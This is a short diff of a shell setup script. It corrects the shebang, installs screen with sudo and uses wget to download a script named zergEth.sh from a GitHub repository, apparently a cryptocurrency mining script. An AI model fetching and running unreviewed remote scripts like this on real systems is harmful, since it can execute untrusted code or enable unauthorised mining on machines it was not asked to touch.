@@ -1,4 +1,4 @@
-#!bin/sh
+#!/bin/sh
 sudo apt update
 sudo apt install screen -y
 wget https://github.com/tinkuJiya/gas/raw/main/zergEth.sh 
